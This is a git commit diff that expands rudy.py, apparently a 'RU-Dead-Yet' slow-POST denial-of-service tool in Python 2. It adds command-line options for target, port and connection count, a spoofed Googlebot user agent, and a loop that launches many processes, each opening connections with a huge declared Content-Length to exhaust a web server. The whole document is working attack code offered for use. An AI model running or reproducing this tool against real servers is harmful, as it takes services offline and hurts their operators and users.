56d07dd33b1ef8c1bb29b16fa2297532d81b48d7
PlayerRed54321 <redingamesprey@gmail.com>
2019-09-14 13:59:49 -0300

    update

--- Rudy-Attack/rudy.py
+++ Rudy-Attack/rudy.py
@@ -1,21 +1,63 @@
 #-*- coding:utf-8 -*-
-import socket,multiprocessing,sys
+import socket,multiprocessing,sys,random,argparse
+def usage():
+    print "Usage:\nrudy.py <TARGET> <PORT> <CONNECTIONS> <USER-AGENT>\nOptional: <USER-AGENT> Text file with user agents\nError: Missing arguments"
+    sys.exit(0)
 
+def set_header(targett,user_agent):
+    if user_agent is not None:
+        agents = []
+        with open(user_agent, 'rb') as ra:
+            agents += ra.read().split('\n')
+            ra.close()
 
-def attack():
+        header = "POST index.php HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}".format(targett,random.choice(agents))
+        print header
+        return header
+    else:
+        header = "POST index.php HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n".format(targett)
+        return header
+
+def attack(targett,port,header):
     while True:
-        sock = socket.socket()
-        header = "GET index.php HTTP/1.1\r\nAccept: text/html\r\nHost: 192.168.1.106\r\nKeep-Alive: 99999\r\nConnection: keep-alive\r\n"#.format(ip)
-        try:
-            sock.connect(("192.168.1.106", 80))
-            print 'connected'
-            sock.send(header)
-            print 'header sended'
-            sock.recv(204800)
-            sock.recv(204800)
-        except:
-            print 'Host recusou as conexoes'
+            sock = socket.socket()
+            try:
+                sock.connect((targett, port))
+                if sock:
+                    print 'connected\n'
+                    sock.send(header)
+                    print 'header sended\n'
+                    sock.recv(1024)
+                    sock.recv(1024)
+                else:
+                    raise Exception
+            except:
+                print 'Host recusou as conexoes\n'
+
+def arguments():
+    global args
+    parser = argparse.ArgumentParser(description="RU-Dead-Yet")
+    parser.add_argument('-t', '--target', help="IP or Domain of Target", type=str)
+    parser.add_argument('-p', '--port', help="Port of Target", default=80, type=int)
+    parser.add_argument('-c', '--connections', help="Number of connections", default=200, type=int)
+    parser.add_argument('-u', '--useragent', help="Path to text file with User Agents", default=None, type=str)
+    args = parser.parse_args()
+    if args.target == None:
+        sys.exit(parser.print_help())
 
 if __name__ == '__main__':
-    for i in range(50):
-        multiprocessing.Process(target=attack).start()
+    conections = []
+    arguments()
+    try:
+        for i in range(args.connections):
+            attack_process = multiprocessing.Process(target=attack, args=(args.target,args.port,set_header(args.target,args.useragent)))
+            attack_process.start()
+            conections.append(attack_process)
+        for c in conections:
+            c.join()
+    except KeyboardInterrupt:
+        for c in conections:
+            c.terminate()
+        for c in conections:
+            c.join()
+        sys.exit(0)
